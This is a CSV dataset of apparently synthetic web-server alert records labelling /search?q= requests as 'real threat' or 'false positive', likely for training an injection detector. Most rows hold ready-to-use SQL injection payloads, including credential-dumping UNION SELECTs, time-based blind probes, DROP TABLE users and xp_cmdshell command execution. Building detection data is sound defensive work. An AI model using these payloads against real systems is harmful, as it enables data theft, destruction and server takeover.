_source.data.url,_source.rule.firedtimes,_source.rule.level,label
/search?q=1',4,8,false positive
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,12,15,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",3,15,real threat
/search?q='; WAITFOR DELAY '0:0:5'--,11,11,real threat
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,8,13,real threat
/search?q=%27+OR+1%3D1--,10,14,real threat
/search?q=' OR '1'='1,13,13,real threat
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,15,11,real threat
/search?q='%',1,7,false positive
/search?q=%3Ctest%3E,3,7,false positive
/search?q=',1,6,false positive
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",4,6,real threat
/search?q=' OR 1=1 LIMIT 1--,4,6,real threat
/search?q='',4,6,false positive
/search?q=' OR '1'='1,10,10,real threat
/search?q=' AND '1'='2,15,6,real threat
/search?q=%27+UNION+SELECT+null--,11,15,real threat
/search?q=' OR 'x'='x'--,3,12,real threat
/search?q=%27+AND+1%3D2--,1,13,real threat
/search?q=' OR 'x'='x'--,12,10,real threat
/search?q=' OR 'x'='x'--,10,12,real threat
/search?q=admin,5,5,false positive
/search?q='OR',4,6,false positive
/search?q='=',4,6,false positive
/search?q=' UNION SELECT null--,15,15,real threat
/search?q=' AND '1'='2,13,6,real threat
/search?q=%27+OR+1%3D1--,4,20,real threat
"/search?q=' UNION SELECT username, password FROM users--",15,12,real threat
/search?q=%3Ctest%3E,4,5,false positive
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,13,12,real threat
/search?q='; WAITFOR DELAY '0:0:5'--,5,6,real threat
/search?q=%27+AND+1%3D2--,12,15,real threat
/search?q=' AND 1=1--,10,6,real threat
/search?q=' OR 1=1 LIMIT 1--,14,20,real threat
/search?q=' AND '1'='2,15,6,real threat
/search?q=1',1,6,false positive
"/search?q=""test""",3,8,false positive
/search?q='abc',1,5,false positive
/search?q=' OR 1=1; --,13,12,real threat
/search?q='; WAITFOR DELAY '0:0:5'--,4,11,real threat
/search?q=' OR 'x'='x'#,14,14,real threat
/search?q=<script>alert(1)</script>,4,5,false positive
/search?q=' OR '1'='1,14,16,real threat
/search?q=' OR 1=1; --,8,20,real threat
/search?q=',2,8,false positive
/search?q=' OR 1=1; --,3,6,real threat
/search?q='; SELECT * FROM admin--,1,16,real threat
/search?q='OR',2,8,false positive
/search?q=' AND '1'='2,6,11,real threat
/search?q='abc',5,8,false positive
/search?q='=',4,8,false positive
/search?q=' AND '1'='2,5,14,real threat
/search?q=1',2,6,false positive
/search?q=%27+AND+1%3D2--,6,13,real threat
/search?q=' AND 1=2--,9,13,real threat
/search?q=' OR 'a'='a,5,14,real threat
/search?q=' OR 1=1 -- -,2,15,real threat
/search?q='',2,6,false positive
/search?q=%27%3B+DROP+TABLE+users--,5,6,real threat
/search?q=' OR 1=1#,7,15,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,11,11,real threat
/search?q='DROP',5,7,false positive
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,1,10,real threat
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,12,6,real threat
/search?q=%27%3B+SELECT+%2A+FROM+admin--,9,14,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,1,20,real threat
/search?q=' OR 'x'='x'#,11,11,real threat
"/search?q=""test""",1,6,false positive
/search?q=',1,8,false positive
/search?q=<script>alert(1)</script>,3,8,false positive
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",2,12,real threat
/search?q=' OR 1=1 -- -,14,10,real threat
/search?q=%27+UNION+SELECT+null--,14,15,real threat
/search?q=%3Ctest%3E,1,8,false positive
/search?q='',5,8,false positive
/search?q=%27--,6,15,real threat
/search?q=%27--,5,16,real threat
/search?q=%27+UNION+SELECT+null--,15,12,real threat
/search?q=' UNION SELECT null--,14,11,real threat
/search?q=' OR EXISTS(SELECT * FROM users)--,12,12,real threat
/search?q=1',3,6,false positive
/search?q='=',5,5,false positive
/search?q='',3,7,false positive
/search?q='; WAITFOR DELAY '0:0:5'--,4,14,real threat
/search?q=1',2,7,false positive
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,6,14,real threat
/search?q='abc',2,8,false positive
/search?q=' OR 1=1 LIMIT 1--,11,10,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",11,15,real threat
/search?q=' AND '1'='2,4,10,real threat
/search?q=' OR 'x'='x'--,8,12,real threat
/search?q='DROP',2,6,false positive
/search?q=%27+OR+1%3D1--,7,6,real threat
/search?q='; EXEC xp_cmdshell('dir')--,9,10,real threat
/search?q=%27%3B+SELECT+%2A+FROM+admin--,15,13,real threat
/search?q=%27+OR+%271%27%3D%271,14,13,real threat
/search?q=' OR 1=1 LIMIT 1--,11,6,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,13,12,real threat
/search?q=' OR pg_sleep(5)--,8,16,real threat
/search?q=' AND 1=2--,14,11,real threat
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",3,16,real threat
/search?q=%27+UNION+SELECT+null--,7,12,real threat
/search?q='; DROP TABLE users--,4,6,real threat
/search?q='OR',5,5,false positive
/search?q=' OR 1=1;#,4,11,real threat
"/search?q=' UNION ALL SELECT 1,2,3,4--",4,15,real threat
/search?q=%27--,15,10,real threat
/search?q=' OR 'x'='x'#,12,12,real threat
/search?q=%27%3B+SELECT+%2A+FROM+admin--,3,6,real threat
/search?q=',1,6,false positive
/search?q='; SELECT * FROM admin--,15,11,real threat
"/search?q=""test""",1,5,false positive
/search?q='OR',2,8,false positive
/search?q=%27--,12,16,real threat
/search?q=%27%3B+SELECT+%2A+FROM+admin--,9,15,real threat
"/search?q=' UNION SELECT username, password FROM users--",13,11,real threat
/search?q=' OR 1=1 -- -,4,20,real threat
/search?q='; DROP TABLE users--,14,6,real threat
"/search?q=""test""",2,7,false positive
/search?q=',2,6,false positive
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",1,6,real threat
/search?q=%27+OR+%271%27%3D%271,7,13,real threat
/search?q=' OR 'a'='a,14,20,real threat
/search?q=%27+OR+%271%27%3D%271,3,10,real threat
/search?q=%27%3B+DROP+TABLE+users--,3,6,real threat
/search?q=1',2,6,false positive
/search?q=' AND '1'='2,7,15,real threat
/search?q='abc',5,6,false positive
/search?q='; WAITFOR DELAY '0:0:5'--,4,11,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",11,13,real threat
/search?q='=',3,7,false positive
/search?q=' AND 1=2--,4,12,real threat
/search?q=<script>alert(1)</script>,4,7,false positive
/search?q=' OR '1'='1,8,15,real threat
/search?q=',2,8,false positive
/search?q=%3Ctest%3E,2,8,false positive
"/search?q=""test""",5,6,false positive
/search?q=' AND 1=1--,12,15,real threat
/search?q=' AND '1'='2,8,11,real threat
/search?q='',5,5,false positive
"/search?q=""test""",2,5,false positive
/search?q=' OR 1=1#,2,13,real threat
/search?q=' OR 1=1#,4,12,real threat
/search?q=1',3,5,false positive
/search?q=',1,5,false positive
/search?q=1',4,5,false positive
/search?q=' UNION SELECT null--,5,16,real threat
/search?q=' OR '1'='1,8,10,real threat
/search?q=' AND '1'='2,15,15,real threat
/search?q='abc',2,6,false positive
/search?q=',2,8,false positive
/search?q='=',4,7,false positive
/search?q='DROP',3,7,false positive
/search?q=' OR pg_sleep(5)--,12,12,real threat
/search?q=' OR 1=1; --,13,10,real threat
/search?q='%',5,6,false positive
/search?q='',5,7,false positive
/search?q=1',2,7,false positive
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,11,11,real threat
/search?q='%',1,7,false positive
"/search?q=""test""",2,5,false positive
/search?q=' UNION SELECT null--,10,15,real threat
/search?q=admin,2,8,false positive
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,15,10,real threat
/search?q='abc',4,5,false positive
/search?q=%27--,11,13,real threat
"/search?q=' UNION ALL SELECT 1,2,3,4--",13,11,real threat
/search?q=%27+OR+1%3D1--,10,10,real threat
/search?q='; WAITFOR DELAY '0:0:5'--,12,10,real threat
/search?q=1',5,8,false positive
/search?q=' OR 'x'='x'#,15,16,real threat
/search?q=' OR 1=1/*,11,14,real threat
/search?q=' OR 1=1 LIMIT 1--,12,13,real threat
/search?q=' OR 'x'='x'#,13,10,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,14,16,real threat
/search?q=' OR 1=1 LIMIT 1--,15,10,real threat
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,13,20,real threat
/search?q=%3Ctest%3E,1,5,false positive
/search?q=%3Ctest%3E,3,7,false positive
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",15,11,real threat
/search?q=' OR 'a'='a,7,12,real threat
/search?q=%3Ctest%3E,1,5,false positive
/search?q=%27%3B+DROP+TABLE+users--,12,6,real threat
/search?q=1',4,8,false positive
/search?q=<script>alert(1)</script>,5,7,false positive
"/search?q=""test""",2,7,false positive
/search?q='DROP',2,6,false positive
/search?q='',4,5,false positive
/search?q=<script>alert(1)</script>,3,8,false positive
/search?q='abc',1,5,false positive
/search?q=1',1,6,false positive
/search?q=admin,1,7,false positive
/search?q='; DROP TABLE users--,2,11,real threat
/search?q='abc',3,8,false positive
/search?q=' OR 'x'='x'--,6,6,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",6,12,real threat
/search?q=' OR pg_sleep(5)--,12,13,real threat
/search?q=admin,2,5,false positive
/search?q=' OR 1=1;#,5,11,real threat
/search?q=' OR pg_sleep(5)--,7,11,real threat
/search?q=' AND 1=2--,2,10,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",3,20,real threat
/search?q='; SELECT * FROM admin--,4,15,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",1,12,real threat
/search?q='=',5,8,false positive
/search?q=' UNION SELECT null--,7,11,real threat
"/search?q=""test""",1,7,false positive
/search?q=1',5,7,false positive
"/search?q=""test""",5,6,false positive
/search?q='abc',4,5,false positive
/search?q=' UNION SELECT null--,10,20,real threat
/search?q=' OR 1=1 LIMIT 1--,2,12,real threat
/search?q=%27+UNION+SELECT+null--,4,11,real threat
/search?q=' OR 1=1 LIMIT 1--,13,14,real threat
/search?q='abc',3,5,false positive
/search?q=1',3,6,false positive
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,15,14,real threat
/search?q='DROP',2,5,false positive
/search?q=' OR ''=',2,11,real threat
/search?q=%27+UNION+SELECT+null--,15,16,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,14,14,real threat
/search?q=' OR 'a'='a,4,16,real threat
/search?q='OR',4,8,false positive
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,1,12,real threat
/search?q=' OR 'a'='a,2,16,real threat
/search?q=' UNION SELECT null--,10,20,real threat
/search?q='=',4,5,false positive
"/search?q=""test""",3,8,false positive
/search?q=' OR '1'='1,14,11,real threat
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,2,12,real threat
/search?q=' AND '1'='2,13,15,real threat
/search?q=1',4,6,false positive
/search?q=' OR 1=1; --,3,11,real threat
/search?q=%27--,7,10,real threat
/search?q='abc',1,8,false positive
/search?q=%27+UNION+SELECT+null--,7,13,real threat
/search?q=' OR EXISTS(SELECT * FROM users)--,8,20,real threat
/search?q=<script>alert(1)</script>,5,7,false positive
/search?q=' AND 1=1--,7,6,real threat
/search?q=' OR '1'='1,9,11,real threat
/search?q=',1,8,false positive
/search?q=%27%3B+DROP+TABLE+users--,9,12,real threat
/search?q='',2,8,false positive
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",8,14,real threat
/search?q='OR',3,6,false positive
/search?q=' OR SLEEP(5)--,4,15,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,4,16,real threat
/search?q=' OR 1=1;#,2,15,real threat
/search?q=' UNION SELECT null--,8,12,real threat
/search?q=' OR 1=1 LIMIT 1--,3,11,real threat
/search?q=%27%3B+DROP+TABLE+users--,7,20,real threat
/search?q='OR',1,6,false positive
"/search?q=""test""",2,5,false positive
/search?q=' OR 'x'='x'--,10,15,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,7,11,real threat
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,7,16,real threat
/search?q='=',4,5,false positive
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",2,15,real threat
/search?q=1',1,6,false positive
/search?q=' OR '1'='1,9,16,real threat
"/search?q=""test""",1,5,false positive
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",9,10,real threat
/search?q=%27--,5,12,real threat
/search?q='; EXEC xp_cmdshell('dir')--,13,20,real threat
/search?q='OR',3,8,false positive
/search?q=admin,5,5,false positive
/search?q='',5,5,false positive
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,13,14,real threat
/search?q='OR',2,6,false positive
/search?q='; DROP TABLE users--,13,16,real threat
/search?q='OR',2,5,false positive
/search?q=' OR 'x'='x'#,14,10,real threat
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,4,11,real threat
/search?q='; EXEC xp_cmdshell('dir')--,2,11,real threat
/search?q='',2,7,false positive
/search?q=%27+AND+1%3D2--,14,20,real threat
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,4,13,real threat
/search?q='OR',5,6,false positive
/search?q='DROP',1,7,false positive
/search?q='=',1,7,false positive
/search?q=' UNION SELECT null--,7,15,real threat
/search?q='; WAITFOR DELAY '0:0:5'--,14,16,real threat
/search?q=' OR 1=1--,8,15,real threat
/search?q=' UNION SELECT null--,9,13,real threat
/search?q=%27%3B+DROP+TABLE+users--,4,16,real threat
/search?q=admin,3,6,false positive
"/search?q=""test""",3,6,false positive
/search?q=admin,5,8,false positive
/search?q=%27%3B+SELECT+%2A+FROM+admin--,3,13,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,8,13,real threat
/search?q=' OR 1=1--,7,20,real threat
/search?q=%27+AND+1%3D2--,11,15,real threat
/search?q='DROP',4,8,false positive
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,3,13,real threat
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,7,12,real threat
/search?q=',4,7,false positive
/search?q=' OR 'x'='x'--,4,13,real threat
/search?q=<script>alert(1)</script>,2,5,false positive
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",13,13,real threat
/search?q=%27--,1,16,real threat
/search?q=' OR 1=1; --,5,13,real threat
/search?q='; WAITFOR DELAY '0:0:5'--,6,10,real threat
/search?q='DROP',5,6,false positive
/search?q=%27+OR+%271%27%3D%271,12,10,real threat
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",1,16,real threat
/search?q='; EXEC xp_cmdshell('dir')--,15,13,real threat
/search?q=' AND '1'='2,10,6,real threat
/search?q='; WAITFOR DELAY '0:0:5'--,6,13,real threat
"/search?q=""test""",1,5,false positive
/search?q=' OR 1=1 LIMIT 1--,5,20,real threat
/search?q=' OR 1=1 -- -,13,16,real threat
/search?q='%',4,7,false positive
/search?q='DROP',3,6,false positive
"/search?q=""test""",5,6,false positive
/search?q=',4,6,false positive
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",3,20,real threat
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,9,15,real threat
/search?q='=',5,5,false positive
/search?q='%',1,8,false positive
/search?q=' OR 1=1;#,13,13,real threat
/search?q=' UNION SELECT null--,3,15,real threat
/search?q=' AND '1'='2,7,13,real threat
/search?q=admin,3,7,false positive
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,14,11,real threat
"/search?q=""test""",5,5,false positive
/search?q='=',2,7,false positive
/search?q=1',3,5,false positive
/search?q=%27+OR+%271%27%3D%271,8,13,real threat
/search?q=' OR EXISTS(SELECT * FROM users)--,7,14,real threat
/search?q=%27+OR+%271%27%3D%271,8,15,real threat
"/search?q=""test""",3,6,false positive
/search?q=' OR 'x'='x'#,9,15,real threat
/search?q='; DROP TABLE users--,7,12,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,4,11,real threat
/search?q=' OR 1=1/*,7,6,real threat
/search?q='',1,6,false positive
/search?q=' OR EXISTS(SELECT * FROM users)--,6,13,real threat
/search?q='=',5,8,false positive
/search?q='OR',3,5,false positive
"/search?q=' UNION ALL SELECT 1,2,3,4--",12,12,real threat
/search?q=%27+UNION+SELECT+null--,7,12,real threat
/search?q=%3Ctest%3E,4,5,false positive
/search?q='=',4,8,false positive
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,12,13,real threat
/search?q=<script>alert(1)</script>,2,7,false positive
/search?q=admin,1,5,false positive
/search?q=%27+AND+1%3D2--,3,14,real threat
/search?q=' AND 1=1--,15,14,real threat
/search?q=admin,3,7,false positive
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,1,14,real threat
/search?q='%',5,8,false positive
/search?q=' OR 1=1 LIMIT 1--,9,14,real threat
/search?q='=',1,6,false positive
/search?q='%',2,5,false positive
/search?q=%3Ctest%3E,3,5,false positive
/search?q='',2,7,false positive
/search?q=' OR SLEEP(5)--,5,20,real threat
/search?q='DROP',5,7,false positive
/search?q=' OR 1=1;#,14,20,real threat
/search?q='OR',4,8,false positive
/search?q=' OR 1=1 LIMIT 1--,4,13,real threat
/search?q='; SELECT * FROM admin--,4,14,real threat
/search?q=%27+UNION+SELECT+null--,5,6,real threat
/search?q='=',1,7,false positive
/search?q=%27--,15,14,real threat
/search?q='abc',5,6,false positive
/search?q=%27%3B+SELECT+%2A+FROM+admin--,1,13,real threat
/search?q=' AND '1'='2,8,15,real threat
/search?q=' OR 1=1 LIMIT 1--,15,14,real threat
/search?q=',2,6,false positive
/search?q=%27%3B+DROP+TABLE+users--,4,11,real threat
/search?q=<script>alert(1)</script>,4,8,false positive
/search?q=' OR 1=1 LIMIT 1--,15,10,real threat
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,9,12,real threat
/search?q='%',4,7,false positive
/search?q=' OR 1=1 -- -,4,12,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,8,15,real threat
/search?q='abc',2,8,false positive
"/search?q=' UNION ALL SELECT 1,2,3,4--",2,6,real threat
/search?q=' OR 1=1#,7,20,real threat
/search?q=%3Ctest%3E,5,7,false positive
/search?q='; SELECT * FROM admin--,11,15,real threat
/search?q='OR',2,7,false positive
/search?q='abc',2,8,false positive
/search?q=' OR ''=',4,14,real threat
/search?q=admin,4,6,false positive
/search?q=admin,5,6,false positive
/search?q=%27--,5,14,real threat
/search?q='abc',4,6,false positive
/search?q=' OR '1'='1,15,13,real threat
/search?q='abc',5,7,false positive
/search?q=' OR 'x'='x'--,4,20,real threat
/search?q=' OR 1=1#,3,15,real threat
/search?q='%',5,6,false positive
/search?q=' OR SLEEP(5)--,15,14,real threat
"/search?q=' UNION SELECT username, password FROM users--",2,11,real threat
/search?q=' OR 1=1 -- -,10,15,real threat
/search?q=' UNION SELECT null--,1,15,real threat
/search?q=%27%3B+DROP+TABLE+users--,4,20,real threat
/search?q=' OR 1=1 LIMIT 1--,8,14,real threat
/search?q=%3Ctest%3E,5,5,false positive
/search?q=<script>alert(1)</script>,3,8,false positive
/search?q=<script>alert(1)</script>,5,5,false positive
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,14,16,real threat
/search?q=1',5,5,false positive
/search?q=' AND 1=2--,5,20,real threat
/search?q=' OR 1=1#,14,20,real threat
/search?q=admin,5,6,false positive
/search?q=' OR 1=1 LIMIT 1--,7,15,real threat
/search?q=1',1,5,false positive
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,8,16,real threat
/search?q=' OR 'a'='a,5,11,real threat
/search?q='DROP',2,6,false positive
/search?q=%27+AND+1%3D2--,9,20,real threat
/search?q=' OR 1=1; --,10,16,real threat
/search?q=admin,3,6,false positive
/search?q='DROP',3,8,false positive
/search?q=1',1,7,false positive
/search?q=%27+OR+%271%27%3D%271,3,12,real threat
/search?q=%27+OR+1%3D1--,4,13,real threat
/search?q=' OR 1=1--,13,13,real threat
/search?q='',2,7,false positive
/search?q='OR',2,7,false positive
/search?q=' OR 'x'='x'#,15,11,real threat
/search?q='OR',5,6,false positive
/search?q=' OR pg_sleep(5)--,13,15,real threat
/search?q=' OR 1=1;#,13,11,real threat
/search?q=<script>alert(1)</script>,2,5,false positive
/search?q='%',5,7,false positive
/search?q=%27--,8,20,real threat
/search?q=%27+OR+%271%27%3D%271,1,15,real threat
/search?q='abc',3,8,false positive
/search?q='OR',3,6,false positive
/search?q='%',4,5,false positive
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",12,13,real threat
/search?q=' OR 'x'='x'#,14,14,real threat
/search?q=%27+AND+1%3D2--,10,14,real threat
/search?q=' AND 1=2--,8,15,real threat
/search?q=%27+UNION+SELECT+null--,10,20,real threat
/search?q=' AND 1=(SELECT COUNT(*) FROM users)--,2,14,real threat
/search?q=%27+AND+1%3D2--,6,12,real threat
/search?q=admin,5,6,false positive
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",3,13,real threat
/search?q=%27+OR+1%3D1--,6,13,real threat
"/search?q=' UNION ALL SELECT 1,2,3,4--",5,11,real threat
/search?q=' OR SLEEP(5)--,5,20,real threat
/search?q='; EXEC xp_cmdshell('dir')--,15,16,real threat
/search?q='',5,8,false positive
/search?q=%27%3B+SELECT+%2A+FROM+admin--,8,6,real threat
/search?q=' UNION SELECT null--,11,10,real threat
/search?q=' OR 'x'='x'#,7,20,real threat
/search?q='=',3,8,false positive
/search?q=admin,5,6,false positive
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,9,11,real threat
/search?q=' OR 1=1--,7,13,real threat
/search?q=%27--,6,13,real threat
/search?q=',1,5,false positive
/search?q='abc',5,8,false positive
/search?q='%',3,6,false positive
/search?q=%27%3B+DROP+TABLE+users--,6,13,real threat
/search?q=',5,5,false positive
/search?q=' OR EXISTS(SELECT * FROM users)--,15,11,real threat
/search?q='abc',3,6,false positive
/search?q=%27%3B+SELECT+%2A+FROM+admin--,6,13,real threat
/search?q=' AND 1=1--,13,6,real threat
/search?q='=',5,7,false positive
"/search?q=""test""",2,6,false positive
/search?q=' OR 1=1 -- -,14,12,real threat
/search?q=' OR ''=',13,14,real threat
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,4,10,real threat
/search?q=' AND '1'='2,5,10,real threat
"/search?q=""test""",5,7,false positive
/search?q=' OR 1=1#,3,16,real threat
/search?q=%27+OR+1%3D1--,4,6,real threat
/search?q='=',5,8,false positive
/search?q=',1,7,false positive
"/search?q=""test""",3,6,false positive
/search?q=%3Ctest%3E,1,5,false positive
/search?q=%3Ctest%3E,2,7,false positive
/search?q=' OR 'a'='a,5,6,real threat
/search?q='DROP',1,6,false positive
/search?q=' OR 1=1;#,4,20,real threat
/search?q='DROP',5,5,false positive
/search?q='OR',2,6,false positive
/search?q='%',1,6,false positive
/search?q=1',2,6,false positive
/search?q='; EXEC xp_cmdshell('dir')--,5,13,real threat
/search?q='DROP',3,7,false positive
/search?q=' OR '1'='1,4,6,real threat
/search?q=' OR 1=1/*,4,20,real threat
/search?q=' OR 'a'='a,14,13,real threat
/search?q='DROP',5,7,false positive
/search?q='%',4,6,false positive
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,15,6,real threat
/search?q='OR',3,5,false positive
/search?q=%27%3B+DROP+TABLE+users--,10,12,real threat
/search?q=' OR ''=',9,10,real threat
/search?q='',5,5,false positive
"/search?q=' UNION SELECT username, password FROM users--",11,14,real threat
/search?q=' OR 1=1;#,4,11,real threat
"/search?q=' AND ASCII(SUBSTRING(@@version, 1, 1)) > 52--",9,6,real threat
/search?q=' OR 1=1--,14,15,real threat
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,12,11,real threat
/search?q='; DROP TABLE users--,10,6,real threat
/search?q=1',4,6,false positive
/search?q=' OR 1=1--,14,6,real threat
/search?q=' OR (SELECT COUNT(*) FROM information_schema.tables)>0--,13,13,real threat
/search?q=%3Ctest%3E,3,6,false positive
/search?q=%27--,5,10,real threat
/search?q=' OR 1=1 -- -,15,11,real threat
/search?q=' OR ''=',3,10,real threat
/search?q='=',2,7,false positive
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,1,14,real threat
/search?q='DROP',2,5,false positive
/search?q=%27%3B+DROP+TABLE+users--,12,16,real threat
/search?q=' OR 'x'='x'#,14,20,real threat
/search?q=%3Ctest%3E,4,8,false positive
"/search?q=""test""",4,8,false positive
/search?q=%27+OR+%271%27%3D%271,5,13,real threat
/search?q=<script>alert(1)</script>,1,8,false positive
/search?q=' AND 1=2--,11,6,real threat
"/search?q=' UNION SELECT username, password FROM users--",14,16,real threat
/search?q=',5,7,false positive
/search?q=' OR 'x'='x'--,7,20,real threat
/search?q=' OR 1=1#,14,15,real threat
/search?q='abc',2,8,false positive
"/search?q=' AND SUBSTRING(@@version, 1, 1) = '5'--",13,14,real threat
/search?q='=',1,7,false positive
/search?q=' OR ''=',4,15,real threat
/search?q=' OR 1=1/*,8,6,real threat
/search?q='',1,8,false positive
/search?q=%27+UNION+SELECT+null--,10,11,real threat
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,9,12,real threat
/search?q=%27%3B+EXEC+xp_cmdshell%28%27dir%27%29--,1,11,real threat
/search?q=%27+UNION+SELECT+null--,13,15,real threat
/search?q='%',2,5,false positive
"/search?q=' UNION ALL SELECT 1,2,3,4--",5,12,real threat
/search?q=' AND 1=1--,11,16,real threat
/search?q='',5,7,false positive
/search?q=admin,4,8,false positive
/search?q='DROP',1,6,false positive
/search?q='; WAITFOR DELAY '0:0:5'--,3,20,real threat
/search?q='DROP',1,5,false positive
/search?q='DROP',1,6,false positive
/search?q=' OR 'x'='x'#,7,14,real threat
/search?q='%',2,6,false positive
"/search?q=' UNION ALL SELECT 1,2,3,4--",6,14,real threat
/search?q='OR',2,6,false positive
/search?q=<script>alert(1)</script>,2,6,false positive
/search?q=%3Ctest%3E,1,5,false positive
/search?q='=',2,6,false positive
/search?q='',4,5,false positive
/search?q='OR',4,7,false positive
/search?q=' OR 'x'='x'--,5,14,real threat
/search?q='=',2,6,false positive
/search?q=%27+AND+ASCII%28SUBSTRING%28%40%40version%2C1%2C1%29%29%3E52--,15,12,real threat
/search?q=',2,6,false positive
/search?q=' OR 1=1 LIMIT 1--,3,16,real threat
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,8,12,real threat
/search?q='%',4,7,false positive
/search?q='; EXEC xp_cmdshell('dir')--,4,12,real threat
/search?q=' OR ''=',2,12,real threat
"/search?q=""test""",3,6,false positive
/search?q=1',4,7,false positive
/search?q=' OR 'x'='x'#,4,6,real threat
/search?q='; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--,13,14,real threat
/search?q=',5,6,false positive
/search?q=',5,8,false positive
/search?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--,13,11,real threat
/search?q='%',4,8,false positive
